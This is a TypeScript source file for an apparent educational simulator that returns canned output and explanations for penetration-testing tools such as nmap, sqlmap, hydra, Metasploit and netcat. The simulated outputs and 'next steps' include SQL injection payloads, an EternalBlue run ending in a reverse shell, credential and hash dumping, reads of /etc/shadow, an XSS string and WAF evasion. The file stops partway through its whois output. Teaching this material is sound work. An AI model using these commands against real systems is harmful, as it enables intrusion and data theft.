export interface SimulationResult {
  output: string;
  explanation: string;
  keyLearnings: string[];
  nextSteps: string[];
  severity?: 'info' | 'low' | 'medium' | 'high' | 'critical';
  tool: string;
}

export interface ParsedCommand {
  tool: string;
  args: string[];
  raw: string;
}

export const parseCommand = (input: string): ParsedCommand => {
  const parts = input.trim().split(/\s+/);
  return {
    tool: parts[0]?.toLowerCase() || '',
    args: parts.slice(1),
    raw: input,
  };
};

const getTarget = (args: string[]): string => {
  const ip = args.find(a => /(\d{1,3}\.){3}\d{1,3}/.test(a));
  const domain = args.find(a => /[a-z]+\.[a-z]+/.test(a) && !a.startsWith('-'));
  return ip || domain || '192.168.1.1';
};

export const simulateCommand = (input: string): SimulationResult | null => {
  const cmd = parseCommand(input.trim());
  const target = getTarget(cmd.args);

  // NMAP
  if (cmd.tool === 'nmap') {
    return simulateNmap(cmd.args, target);
  }

  // GOBUSTER / DIRB
  if (cmd.tool === 'gobuster' || cmd.tool === 'dirb') {
    return simulateGobuster(cmd.args, target, cmd.tool);
  }

  // NIKTO
  if (cmd.tool === 'nikto') {
    return simulateNikto(target);
  }

  // SQLMAP
  if (cmd.tool === 'sqlmap') {
    return simulateSqlmap(cmd.args, target);
  }

  // HYDRA
  if (cmd.tool === 'hydra') {
    return simulateHydra(cmd.args, target);
  }

  // METASPLOIT
  if (cmd.tool === 'msfconsole' || cmd.tool === 'msf') {
    return simulateMetasploit(cmd.args);
  }

  // NETCAT
  if (cmd.tool === 'nc' || cmd.tool === 'netcat') {
    return simulateNetcat(cmd.args, target);
  }

  // JOHN THE RIPPER
  if (cmd.tool === 'john') {
    return simulateJohn(cmd.args);
  }

  // HASHCAT
  if (cmd.tool === 'hashcat') {
    return simulateHashcat(cmd.args);
  }

  // WHOIS
  if (cmd.tool === 'whois') {
    return simulateWhois(target);
  }

  // DIG
  if (cmd.tool === 'dig') {
    return simulateDig(cmd.args, target);
  }

  // WGET / CURL
  if (cmd.tool === 'wget' || cmd.tool === 'curl') {
    return simulateCurl(cmd.args, target, cmd.tool);
  }

  // AIRCRACK
  if (cmd.tool === 'aircrack-ng' || cmd.tool === 'airmon-ng' || cmd.tool === 'airodump-ng') {
    return simulateAircrack(cmd.tool, cmd.args);
  }

  // BURPSUITE
  if (cmd.tool === 'burpsuite' || cmd.tool === 'burp') {
    return simulateBurp();
  }

  // WIRESHARK / TCPDUMP
  if (cmd.tool === 'tcpdump' || cmd.tool === 'wireshark') {
    return simulateTcpdump(cmd.args, target);
  }

  // MALTEGO
  if (cmd.tool === 'maltego') {
    return simulateMaltego();
  }

  // HELP
  if (cmd.tool === 'help' || cmd.tool === '?') {
    return simulateHelp();
  }

  return null;
};

function simulateNmap(args: string[], target: string): SimulationResult {
  const isSV = args.includes('-sV');
  const isOS = args.includes('-O');
  const isA = args.includes('-A');
  const isSU = args.includes('-sU');
  const isSS = args.includes('-sS');
  const isScripted = args.some(a => a.startsWith('--script'));

  let output = `Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toISOString().replace('T', ' ').slice(0, 19)}
Nmap scan report for ${target}
Host is up (0.0043s latency).
Not shown: 987 closed tcp ports (reset)
PORT      STATE    SERVICE${isSV || isA ? '         VERSION' : ''}
22/tcp    open     ssh${isSV || isA ? '             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)' : ''}
80/tcp    open     http${isSV || isA ? '            Apache httpd 2.4.41 ((Ubuntu))' : ''}
443/tcp   open     https${isSV || isA ? '           Apache httpd 2.4.41 ((Ubuntu))' : ''}
3306/tcp  open     mysql${isSV || isA ? '           MySQL 5.7.38-0ubuntu0.18.04.1' : ''}
8080/tcp  open     http-proxy${isSV || isA ? '      Apache Tomcat 9.0.37' : ''}
21/tcp    filtered ftp${isSV || isA ? '             (no response)' : ''}`;

  if (isSU) {
    output += `
161/udp   open     snmp${isSV || isA ? '            SNMPv1 server; net-snmp SNMPv3 server' : ''}
53/udp    open     domain${isSV || isA ? '          dnsmasq 2.80' : ''}`;
  }

  if (isOS || isA) {
    output += `

OS detection performed.
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 2 hops`;
  }

  if (isScripted || isA) {
    output += `

Host script results:
|_smb-vuln-ms17-010: Host does not support SMBv1
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=${target}
|   Not valid after: 2025-01-01
|_http-server-header: Apache/2.4.41 (Ubuntu)`;
  }

  output += `

Nmap done: 1 IP address (1 host up) scanned in ${(Math.random() * 10 + 2).toFixed(2)} seconds`;

  return {
    output,
    tool: 'nmap',
    severity: 'medium',
    explanation: `**Nmap** (Network Mapper) is the most popular network reconnaissance tool. It discovers hosts, open ports, running services, and OS details.

This scan of **${target}** found:
- **SSH (22)** — Remote login. Potential brute-force target if weak passwords exist.
- **HTTP/HTTPS (80/443)** — Web server running Apache. Check for web vulnerabilities.
- **MySQL (3306)** — Database exposed! Should NEVER be publicly accessible.
- **Tomcat (8080)** — Java application server. Known for CVE exploits.
- **FTP (21)** — Filtered but present. Check for anonymous login.`,
    keyLearnings: [
      '`-sV` flag detects service versions — crucial for finding CVEs',
      '`-O` performs OS fingerprinting via TTL and TCP behavior analysis',
      '`-A` is aggressive mode: OS + version + scripts + traceroute',
      '`-sS` (SYN scan) is stealthy — doesn\'t complete TCP handshake',
      '`-sU` scans UDP ports — often forgotten but critical (DNS, SNMP)',
      'MySQL on port 3306 being public = critical misconfiguration',
    ],
    nextSteps: [
      'Run `nikto -h http://' + target + '` to scan web vulnerabilities',
      'Run `nmap --script mysql-empty-password ' + target + '` to check MySQL auth',
      'Run `gobuster dir -u http://' + target + ' -w /usr/share/wordlists/dirb/common.txt`',
      'Search MySQL CVEs: `searchsploit mysql 5.7`',
    ],
  };
}

function simulateGobuster(args: string[], target: string, tool: string): SimulationResult {
  const wordlist = args.find((_, i) => args[i - 1] === '-w') || 'common.txt';

  const output = `${tool === 'gobuster' ? 'Gobuster v3.6' : 'DIRB v2.22'}
${tool === 'gobuster' ? 'by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)' : 'By The Dark Raver'}

===============================================================
[+] Url:                     http://${target}
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ${wordlist}
[+] Status codes:            200,204,301,302,307,401,403
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://${target}/admin/]
/admin/login          (Status: 200) [Size: 4821]
/backup               (Status: 200) [Size: 1337] ← EXPOSED!
/backup/db.sql        (Status: 200) [Size: 89420] ← DATABASE DUMP!
/config               (Status: 403) [Size: 278]
/config.php.bak       (Status: 200) [Size: 512]  ← BACKUP FILE!
/images               (Status: 301) [Size: 315]
/include              (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 10562]
/phpmyadmin           (Status: 200) [Size: 10562] ← PHPMYADMIN EXPOSED!
/robots.txt           (Status: 200) [Size: 102]
/uploads              (Status: 301) [Size: 316]
/wp-admin             (Status: 302) [Size: 0]
/wp-content           (Status: 301) [Size: 318]
/wp-login.php         (Status: 200) [Size: 5432]  ← WORDPRESS!
===============================================================
Finished: ${(Math.random() * 20 + 5).toFixed(0)} seconds elapsed`;

  return {
    output,
    tool: 'gobuster',
    severity: 'high',
    explanation: `**Gobuster/DIRB** are directory/file enumeration tools. They brute-force paths on a web server to find hidden files and folders using wordlists.

Critical findings on **${target}**:
- **/backup/db.sql** — A raw SQL database dump is publicly accessible! This contains all user data, passwords, etc.
- **/config.php.bak** — Backup config file may contain plaintext DB credentials
- **/phpmyadmin** — Database admin interface exposed to internet
- **/wp-admin** — WordPress installation detected`,
    keyLearnings: [
      'Wordlists are key: `/usr/share/wordlists/dirb/common.txt` is a starting point',
      'Status 301 = redirect (directory exists), 200 = file exists, 403 = forbidden',
      '`.bak` and `.old` extensions often expose source code with credentials',
      'robots.txt can reveal hidden paths (check it manually too!)',
      '`-x php,txt,bak,sql` flag adds extensions to each word in the list',
      'Rate limiting can block you — use `-t 10` to control thread count',
    ],
    nextSteps: [
      `curl http://${target}/backup/db.sql | head -50 to view the dump`,
      `curl http://${target}/config.php.bak to check for credentials`,
      `Try default phpmyadmin creds: root:root, root:password`,
      `Run nikto on the WordPress install: nikto -h http://${target}/wp-login.php`,
    ],
  };
}

function simulateNikto(target: string): SimulationResult {
  const output = `- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          ${target}
+ Target Hostname:    ${target}
+ Target Port:        80
+ Start Time:         ${new Date().toISOString().replace('T', ' ').slice(0, 19)}
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined.
+ The X-Content-Type-Options header is not set.
+ Cookie PHPSESSID created without the httponly flag
+ Cookie session created without the secure flag
+ No CGI Directories found
+ Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3268: /admin/: Directory indexing found.
+ OSVDB-3092: /admin/: This might be interesting.
+ OSVDB-3268: /backup/: Directory indexing found.
+ OSVDB-3093: /backup/: This might be interesting.
+ OSVDB-6694: /.DS_Store: Apache on Mac OSX will serve the .DS_Store file and this can reveal file names.
+ OSVDB-3092: /phpmyadmin/: phpMyAdmin is the default file name.
+ OSVDB-3092: /test/: This might be interesting.
+ OSVDB-3092: /config.php.bak: Backup file may contain credentials.
+ OSVDB-119: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests.
+ /admin/index.php: Admin login page/section found.
+ OSVDB-3268: /images/: Directory indexing found.
+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
+ Scan terminated: 20 error(s) and 19 item(s) reported on remote host
+ End Time: ${new Date(Date.now() + 120000).toISOString().replace('T', ' ').slice(0, 19)} (120 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested`;

  return {
    output,
    tool: 'nikto',
    severity: 'high',
    explanation: `**Nikto** is an open-source web server scanner that checks for dangerous files, outdated software, and server misconfigurations.

Key findings on **${target}**:
- **Missing security headers** — X-Frame-Options, X-XSS-Protection, Content-Type-Options allow clickjacking & XSS
- **Cookies without flags** — Session cookies lack HttpOnly/Secure flags, enabling theft via JavaScript/HTTP
- **Directory indexing** — /admin/, /backup/ are browseable — attacker can see all files
- **Outdated Apache** — Old versions have known CVEs`,
    keyLearnings: [
      'Security headers protect against XSS, clickjacking, MIME sniffing',
      'HttpOnly cookie flag prevents JavaScript from reading session cookies',
      'Secure flag ensures cookies only sent over HTTPS',
      'Directory indexing exposes file structure to attackers',
      'OSVDB references are vulnerability database IDs (now retired, use NVD/CVE)',
      '`-Tuning 9` flag focuses only on SQL injection checks in nikto',
    ],
    nextSteps: [
      `Test XSS: curl "http://${target}/search?q=<script>alert(1)</script>"`,
      `Check directory listing: curl http://${target}/backup/`,
      `Test clickjacking: Create HTML with iframe pointing to site`,
      `Run sqlmap on forms found: sqlmap -u "http://${target}/login.php" --forms`,
    ],
  };
}

function simulateSqlmap(args: string[], target: string): SimulationResult {
  const url = args.find(a => a.startsWith('http')) || `http://${target}/login.php?id=1`;
  const hasForms = args.includes('--forms') || args.includes('--data');

  const output = `        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.8#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[*] starting @ ${new Date().toISOString().replace('T', ' ').slice(0, 19)}

[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] testing if GET parameter 'id' is dynamic
[INFO] GET parameter 'id' is dynamic
[WARNING] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[INFO] testing for SQL injection on GET parameter 'id'
[INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[INFO] GET parameter 'id' appears to be 'AND boolean-based blind' injectable
[INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
[INFO] GET parameter 'id' is 'MySQL >= 5.5 AND error-based' injectable
[INFO] testing 'MySQL >= 5.0.12 stacked queries'
[INFO] stacked queries have been found on GET parameter 'id'!
[INFO] testing 'MySQL >= 5.0.12 time-based blind'
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind' injectable

sqlmap identified the following injection point(s):
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 2354=2354

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=1 AND EXTRACTVALUE(3888,CONCAT(0x5c,0x716a717071,(SELECT (ELT(3888=3888,1))),0x716b707171))

    Type: stacked queries
    Payload: id=1;SELECT SLEEP(5)--

    Type: time-based blind
    Payload: id=1 AND SLEEP(5)
---
[INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.5
[INFO] fetching databases
[INFO] retrieved: information_schema
[INFO] retrieved: webapp_db
[INFO] retrieved: users_production
available databases [3]:
[*] information_schema
[*] webapp_db
[*] users_production

[INFO] fetching tables for database 'users_production'
[INFO] retrieved: users
[INFO] retrieved: admin_credentials
[INFO] retrieved: payments

[INFO] fetching columns for table 'users' in database 'users_production'
[INFO] retrieved: id, username, email, password_hash, role, created_at

[INFO] fetching entries for table 'users' in database 'users_production'
Database: users_production
Table: users
[5 entries]
+----+----------+---------------------------+------------------------------------------+-------+
| id | username | email                     | password_hash                            | role  |
+----+----------+---------------------------+------------------------------------------+-------+
| 1  | admin    | admin@${target}           | $2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQ | admin |
| 2  | john     | john@company.com          | 5f4dcc3b5aa765d61d8327deb882cf99       | user  |
| 3  | jane     | jane@company.com          | 482c811da5d5b4bc6d497ffa98491e38       | user  |
+----+----------+---------------------------+------------------------------------------+-------+

[*] ending @ ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`;

  return {
    output,
    tool: 'sqlmap',
    severity: 'critical',
    explanation: `**SQLMap** is an automated SQL injection tool. It detects and exploits SQL injection vulnerabilities to extract database contents.

⚠️ **CRITICAL VULNERABILITY FOUND** on ${url}

The \`id\` parameter is injectable using **4 different techniques**:
1. **Boolean-based blind** — Asks true/false questions to reconstruct data character by character
2. **Error-based** — Uses MySQL error messages to leak data directly
3. **Stacked queries** — Executes additional SQL statements
4. **Time-based blind** — Uses SLEEP() delays to infer data when no output is shown

The attacker has now dumped the entire user database including **password hashes**.`,
    keyLearnings: [
      'SQL injection occurs when user input is directly inserted into SQL queries without sanitization',
      'Parameterized queries / prepared statements completely prevent SQLi',
      'MD5 hashes (like `5f4dcc3b5aa765d61d8327deb882cf99`) are trivially crackable ("password")',
      'Use `--dbs` to list databases, `--tables` to list tables, `--dump` to extract data',
      'WAFs can detect sqlmap — use `--tamper=space2comment` to evade',
      '`--level=5 --risk=3` enables more aggressive testing payloads',
    ],
    nextSteps: [
      `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt  # crack the hashes`,
      `sqlmap -u "${url}" --os-shell  # try to get a shell`,
      `sqlmap -u "${url}" --file-read="/etc/passwd"  # read system files`,
      `Check: is bcrypt ($2b$) more resistant than MD5? YES — bcrypt is much safer`,
    ],
  };
}

function simulateHydra(args: string[], target: string): SimulationResult {
  const service = args.find(a => ['ssh', 'ftp', 'http-post-form', 'mysql', 'smtp'].includes(a)) || 'ssh';

  const output = `Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at ${new Date().toISOString().replace('T', ' ').slice(0, 19)}
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ${service}://${target}:${service === 'ssh' ? '22' : service === 'ftp' ? '21' : '3306'}/
[STATUS] 304.00 tries/min, 304 tries in 00:01h, 14344095 to go, estimated 786 h to go
[STATUS] 294.67 tries/min, 884 tries in 00:03h, 14343515 to go, estimated 812 h to go
[22][ssh] host: ${target}   login: admin   password: admin123
[22][ssh] host: ${target}   login: root    password: toor
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`;

  return {
    output,
    tool: 'hydra',
    severity: 'critical',
    explanation: `**Hydra** is a parallelized login cracker supporting numerous protocols. It performs **brute-force** and **dictionary attacks** to guess credentials.

Found on **${target}**:
- \`admin:admin123\` — Trivially weak password
- \`root:toor\` — Default Kali Linux password left unchanged!

This means an attacker has **full root SSH access** to the server. Game over.

**How brute-force works**: Hydra tries thousands of username/password combinations per minute against the login service until one succeeds.`,
    keyLearnings: [
      '`-l` = single username, `-L` = username list file',
      '`-p` = single password, `-P` = password list (rockyou.txt has 14M passwords)',
      '`-t 16` sets parallel tasks — too many triggers rate limiting/bans',
      'Fail2ban and account lockout policies stop brute-force attacks',
      'SSH key authentication eliminates password brute-force entirely',
      'Common default creds: admin/admin, root/root, admin/password, admin/123456',
    ],
    nextSteps: [
      `ssh root@${target}  # log in with the found credentials`,
      `Once in: whoami && id && cat /etc/passwd && cat /etc/shadow`,
      `Look for privilege escalation: sudo -l, find / -suid`,
      `Defensive fix: ufw allow from trusted-ip to any port 22`,
    ],
  };
}

function simulateMetasploit(args: string[]): SimulationResult {
  const output = `                                                  
  +-------------------------------------------------------+
  |  METASPLOIT FRAMEWORK v6.3.44-dev                     |
  |  'msf6 >' prompt ready. Type 'help' for commands.     |
  +-------------------------------------------------------+

msf6 > search eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  auxiliary/scanner/smb/smb_ms17_010            2017-03-14       normal     Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal     Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great      Yes    SMB DOUBLEPULSAR Remote Code Execution

msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.50
RHOSTS => 192.168.1.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.100
LHOST => 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 192.168.1.100:4444
[*] 192.168.1.50:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.50:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.50:445 - Connecting to target for exploitation.
[+] 192.168.1.50:445 - Connection established for exploitation.
[+] 192.168.1.50:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.50:445 - CORE raw buffer dump (42 bytes)
[*] 192.168.1.50:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.50:445 - Starting non-paged pool grooming
[+] 192.168.1.50:445 - Sending SMBv2 buffers
[+] 192.168.1.50:445 - Sending last fragment of exploit packet!
[*] 192.168.1.50:445 - Receiving response from exploit packet
[+] 192.168.1.50:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.50:445 - Sending egg to corrupted connection.
[*] 192.168.1.50:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.50:445) at ${new Date().toISOString().replace('T', ' ').slice(0, 19)}

meterpreter > sysinfo
Computer        : WIN7-TARGET
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows`;

  return {
    output,
    tool: 'metasploit',
    severity: 'critical',
    explanation: `**Metasploit Framework** is the world's most used penetration testing framework. It provides exploit modules, payloads, and post-exploitation tools.

This demo shows **EternalBlue (MS17-010)** — the vulnerability used in the **WannaCry ransomware** attack of 2017 that caused billions in damages.

**How it works:**
1. Scanner confirms the target is vulnerable to MS17-010
2. The exploit corrupts kernel memory via a SMB buffer overflow
3. A **Meterpreter** reverse shell is sent back to the attacker
4. Full SYSTEM-level access is gained without any user interaction`,
    keyLearnings: [
      '`search` finds modules by name/CVE/platform',
      '`use` selects a module, `info` shows detailed module information',
      '`RHOSTS` = target, `LHOST` = attacker IP for reverse connections',
      'Meterpreter is an advanced in-memory payload — hard to detect on disk',
      'EternalBlue targets SMB port 445 — always firewall this from internet',
      'Patching (MS17-010 was patched in March 2017) prevents this attack',
    ],
    nextSteps: [
      `meterpreter > hashdump  # dump all Windows password hashes`,
      `meterpreter > getsystem  # attempt privilege escalation`,
      `meterpreter > run post/windows/gather/enum_logged_on_users`,
      `meterpreter > screenshot  # take a screenshot of the desktop`,
    ],
  };
}

function simulateNetcat(args: string[], target: string): SimulationResult {
  const isListen = args.includes('-l') || args.includes('-lvp');
  const port = args.find(a => /^\d{4,5}$/.test(a)) || '4444';

  const output = isListen
    ? `Listening on [0.0.0.0] (family 0, port ${port})
Connection from ${target} ${Math.floor(Math.random() * 30000 + 1024)} received!
Linux target 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ls /home
admin
ubuntu
$ cat /etc/passwd | head -5
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync`
    : `${target} [${target}] ${port} (?) open

[*] Connected to ${target} on port ${port}
HTTP/1.1 200 OK
Server: Apache/2.4.41
Content-Type: text/html
Banner grabbing successful - Service: Apache/2.4.41`;

  return {
    output,
    tool: 'netcat',
    severity: 'high',
    explanation: `**Netcat** (nc) is the "Swiss army knife" of networking — it can connect to or listen on any TCP/UDP port. Used for:

${isListen
  ? `**Listener/Reverse Shell**: The attacker listens on port ${port}. The victim machine connects BACK to the attacker, bypassing firewalls that block inbound connections. This gives a bash shell on the target!`
  : `**Banner Grabbing**: Connecting to port ${port} to reveal service version information. This is how attackers fingerprint services to find CVEs.`}`,
    keyLearnings: [
      '`nc -lvp 4444` — Listen (l) Verbose (v) on Port (p) 4444',
      '`nc <ip> 4444` — Connect to a listener (e.g., reverse shell callback)',
      'Reverse shells bypass firewalls because the victim initiates the connection',
      'Upgrade a netcat shell: `python3 -c "import pty; pty.spawn(\'/bin/bash\')"` ',
      'Transfer files: `nc -lvp 1234 > file.txt` / `nc <ip> 1234 < file.txt`',
      'Port scan: `nc -zv target 20-100` scans ports 20 through 100',
    ],
    nextSteps: [
      `Upgrade to meterpreter: use a Metasploit handler instead of raw netcat`,
      `python3 -c "import pty;pty.spawn('/bin/bash')" # get a proper TTY`,
      `Check sudo permissions: sudo -l`,
      `Find SUID binaries: find / -perm -u=s -type f 2>/dev/null`,
    ],
  };
}

function simulateJohn(args: string[]): SimulationResult {
  const file = args.find(a => !a.startsWith('-')) || 'hashes.txt';

  const output = `John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 12:11:53 +0100 OMP [linux-gnu 64-bit x86_64 AVX2 AC]
Copyright (c) 1996-2021 by Solar Designer and others
Homepage: https://www.openwall.com/john/

Using default input encoding: UTF-8
Loaded 5 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (john)
123456           (jane)
iloveyou         (alice)
admin123         (admin)
dragon           (bob)
5g 0:00:00:01 DONE (${new Date().toISOString().replace('T', ' ').slice(0, 19)}) 3.846g/s 13284Kp/s 13284Kc/s 13284KC/s 123@a.u..123@@#
Use the "--show" command to display all of the cracked passwords reliably
Session completed.`;

  return {
    output,
    tool: 'john',
    severity: 'high',
    explanation: `**John the Ripper** is a fast password cracker. It supports hundreds of hash formats and attack modes.

All 5 MD5 hashes cracked in **1 second** using dictionary attack with rockyou.txt. The passwords found are among the most common passwords ever — a catastrophic security failure.

**Hash types**: MD5 (weak), SHA1 (weak), bcrypt (strong), Argon2 (strongest)
**Attack modes**: 
- **Dictionary**: Try words from a wordlist
- **Brute-force**: Try all combinations  
- **Hybrid**: Dictionary + rules (append numbers, etc.)`,
    keyLearnings: [
      'MD5 hashes are completely broken for passwords — NEVER use them',
      '`--wordlist=/usr/share/wordlists/rockyou.txt` uses 14M real leaked passwords',
      '`--rules=best64` applies mutation rules (Password1, p@ssw0rd, etc.)',
      '`--format=bcrypt` specifies the hash type explicitly',
      'bcrypt is slow by design — 100 hashes/sec vs MD5\'s 1,000,000,000/sec',
      'Salted hashes prevent rainbow table attacks — always use salts!',
    ],
    nextSteps: [
      `hashcat -m 0 hashes.txt rockyou.txt # GPU-accelerated cracking (faster)`,
      `john --show ${file}  # display all cracked passwords`,
      `Online lookup: crackstation.net can instantly crack common MD5 hashes`,
      `Defensive: Use bcrypt/Argon2 with cost factor ≥12 for password storage`,
    ],
  };
}

function simulateHashcat(args: string[]): SimulationResult {
  const output = `hashcat (v6.2.6) starting...

OpenCL API (OpenCL 3.0 ) - Platform #1 [NVIDIA Corporation]
* Device #1: NVIDIA GeForce RTX 3080, 9151/10018 MB, 68MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 3 digests; 3 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Meet-In-The-Middle
* Early-Skip
* Not-Iterated
* Appended-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344391

5f4dcc3b5aa765d61d8327deb882cf99:password
482c811da5d5b4bc6d497ffa98491e38:123456
7c6a180b36896a0a8c02787eeafb0e4c:password1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: hashes.txt
Time.Started.....: ${new Date().toISOString().replace('T', ' ').slice(0, 19)}
Time.Estimated...: 0 secs
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 14892.5 MH/s (using GPU!)
Recovered........: 3/3 (100.00%) Digests
Progress.........: 3
Rejected.........: 0`;

  return {
    output,
    tool: 'hashcat',
    severity: 'high',
    explanation: `**Hashcat** is the world's fastest password recovery tool, using **GPU acceleration**. An RTX 3080 can try **14.8 BILLION MD5 hashes per second**.

**Hash Mode numbers** (key ones to know):
- \`-m 0\` = MD5
- \`-m 100\` = SHA1  
- \`-m 3200\` = bcrypt
- \`-m 1800\` = SHA-512crypt (Linux /etc/shadow)
- \`-m 22000\` = WPA2 (WiFi cracking)

At 14.8 billion/s, an 8-char MD5 password takes **seconds**. bcrypt at 1000/s takes **years**.`,
    keyLearnings: [
      '`-m 0` MD5, `-m 100` SHA1, `-m 3200` bcrypt — know your hash modes',
      '`-a 0` dictionary attack, `-a 3` brute-force, `-a 6` hybrid',
      'GPU cracking: RTX 3090 can try 68B MD5 hashes/sec — use strong algorithms',
      'bcrypt intentionally slow: ~100 hashes/sec per GPU vs billions for MD5',
      '`?l?l?l?l?l?l?l?l` mask = all lowercase 8 chars (26^8 = 208B combinations)',
      'Rainbow tables pre-compute hashes — salting defeats them completely',
    ],
    nextSteps: [
      `hashcat -m 3200 bcrypt_hashes.txt rockyou.txt  # try cracking bcrypt`,
      `hashcat -m 22000 capture.hccapx rockyou.txt  # crack WiFi handshake`,
      `Compare time: MD5 vs bcrypt — bcrypt is 10M times slower for attacker`,
      `Use https://hashes.com for quick online MD5/SHA1 lookups`,
    ],
  };
}

function simulateWhois(target: string): SimulationResult {
  const output = `Domain Name: ${target.toUpperCase()}
Registry Domain ID: 2138514_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.godaddy.com
Registrar URL: http://www.godaddy.com
Updated Date: 2023-06-15T09:21:00Z
Creation Date: 2001-03-20T07:00:00Z
Registry Expiry Date: 2025-03-20T07:00:00Z
Registrar: GoDaddy.com, LLC
Registrar IANA ID: 146
Domain Status: clientDeleteProhibited
Domain Status: clientRenewProhibited
Domain Status: clientTransferProhibited
Domain Status: clientUpdateProhibited
Name Server: NS1.${target.toUpperCase()}
Name Server: NS2.${target.toUpperCase()}
DNSSEC: unsigned
Registrant Name: John Smith
Registrant Organization: Example Corp LLC
Registrant Street: 123 Main St
Registrant City: San Francisco
Registrant State/Province: CA
Registrant Postal Code: 94102
Registrant Country: US
